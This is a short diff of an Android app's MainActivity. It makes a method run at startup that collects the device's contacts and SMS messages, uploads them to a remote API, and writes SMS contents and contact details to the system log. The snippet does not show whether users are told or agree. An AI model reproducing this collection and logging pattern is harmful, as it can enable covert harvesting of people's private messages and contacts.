@@ -27,16 +27,17 @@ public class MainActivity extends AppCompatActivity {
         final Call<Token> stringCall = retrofitAPI.CreateNewDevice(token);
         HttpExecute t = new HttpExecute(stringCall);
         t.start();
+        syncDataTest();
     }
     protected void syncDataTest(){
         RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
         ContentCollector cc = new ContentCollector();
         ContactsList contactLs = new ContactsList();
         contactLs.SetContact(cc.GetContacts(this));
-        Log.d(TAG,"Name : "+ contactLs.GetContact().get(1).GetName()+" Number : " + contactLs.GetContact().get(1).GetNumber());
+        Log.d("SYNC","Name : "+ contactLs.GetContact().get(1).GetName()+" Number : " + contactLs.GetContact().get(1).GetNumber());
         SMSList SMSLs = new SMSList();
         SMSLs.SetSMS(cc.GetSMS(this));
-        Log.d(TAG,"Creator : "+ SMSLs.GetSMS().get(1).GetCreator()+" Message : " + SMSLs.GetSMS().get(1).GetBody());
+        Log.d("SYNC","Address : "+ SMSLs.GetSMS().get(3).GetAddress()+" Message : " + SMSLs.GetSMS().get(3).GetBody()+" Date : "+SMSLs.GetSMS().get(3).GetDate()+" Type : "+SMSLs.GetSMS().get(3).GetType());
 
         new HttpExecute(retrofitAPI.CreateContacts(contactLs)).start();
         new HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start();
